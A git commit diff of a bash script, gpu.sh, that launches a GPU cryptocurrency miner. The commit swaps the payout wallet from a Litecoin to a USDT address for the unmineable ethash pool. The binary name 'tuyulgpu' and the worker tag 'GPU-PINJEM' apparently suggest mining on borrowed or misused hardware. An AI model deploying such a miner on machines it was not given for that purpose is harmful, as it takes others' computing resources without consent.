d4d9510dab2d84b2ec690c8d0c0a0fb005ebb610
nuri655 <84915784+nuri655@users.noreply.github.com>
2021-05-28 03:26:19 +0700

    Update gpu.sh

--- gpu.sh
+++ gpu.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 POOL=ethash.unmineable.com:3333
-WALLET=LTC:MBHmGeCHWf7Xzew9vpRuLxmvZTXEvXEk5U
+WALLET=USDT:0x734c50356ef7e511c3baa0bd35d3a6385f41f6a7
 WORKER=$(echo $(shuf -i 1000-9999 -n 1)-GPU-PINJEM)
 
 chmod +x tuyulgpu
